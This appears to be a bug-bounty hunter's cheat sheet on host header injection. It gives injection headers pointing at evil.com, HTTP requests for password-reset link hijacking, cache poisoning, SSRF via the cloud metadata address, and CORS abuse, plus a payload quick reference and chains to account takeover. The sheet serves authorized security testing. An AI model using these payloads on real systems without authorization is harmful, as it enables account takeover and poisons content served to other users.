---
tags: [bugbounty, vuln/host-header, cheatsheet, p2, p3]
aliases: [Host Header Injection, Host Header Attack]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Host Header Injection

> [!tldr] Hunter Summary
> **What:** App trusts the Host header to generate links — inject attacker domain into password reset, cache poisoning, SSRF.
> **Impact:** Password reset link hijack (P1/P2), cache poisoning, SSRF, open redirect.
> **Best targets:** Password reset flow, email templates, any feature that generates absolute URLs.
> **Time to triage:** 10 min. Inject `X-Forwarded-Host: evil.com`, request password reset, check email.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Password reset | Any "forgot password" that sends an email with a link |
| Email templates | Any feature sending emails with links (verify email, notifications) |
| Cache systems | CDN/Varnish in use — host header may be cached |
| Server-side redirects | App generates absolute URLs from Host header |
| Internal services | Routing configs that use Host header for routing |

---

## Injection Headers to Test

```http
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
X-Original-Host: evil.com
```

---

## Step-by-Step Hunt

### Step 1 — Test password reset
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=YOUR_OWN_EMAIL@test.com
```
Check received email: does reset link contain `evil.com`?

Then try with `Host: evil.com` directly:
```http
POST /forgot-password HTTP/1.1
Host: evil.com

email=YOUR_OWN_EMAIL@test.com
```

### Step 2 — Test port injection
```http
Host: target.com:@evil.com
Host: target.com:80@evil.com
Host: target.com:https://evil.com
```

### Step 3 — Test cache poisoning
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
If the response is cached and served to other users with `evil.com` in it → cache poisoning.
Look for: absolute URLs, Open Graph tags, canonical URLs in the response body.

### Step 4 — SSRF via Host header
```http
GET /api/internal HTTP/1.1
Host: 169.254.169.254

# Or:
X-Forwarded-Host: internal.service.local
```

### Step 5 — CORS via Host header
Some apps build CORS allowed origins from Host header:
```http
GET /api/data HTTP/1.1
Host: evil.com
Origin: https://evil.com
```

---

## Payload Quick Ref

```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
Host: target.com:@evil.com
Host: target.com:443.evil.com

# Port manipulation
Host: target.com:6379   (Redis backend?)
Host: target.com:80
```

---

## Chain Ideas

| Host header → | Result |
|---------------|--------|
| Password reset | → Steal reset token → ATO |
| Cache poisoning | → Serve malicious content to all users |
| SSRF via Host | → Internal service access |
| Email link hijack | → Phishing / ATO |

---

## References

- PortSwigger Host Header Injection — https://portswigger.net/web-security/host-header
- James Kettle web cache poisoning research
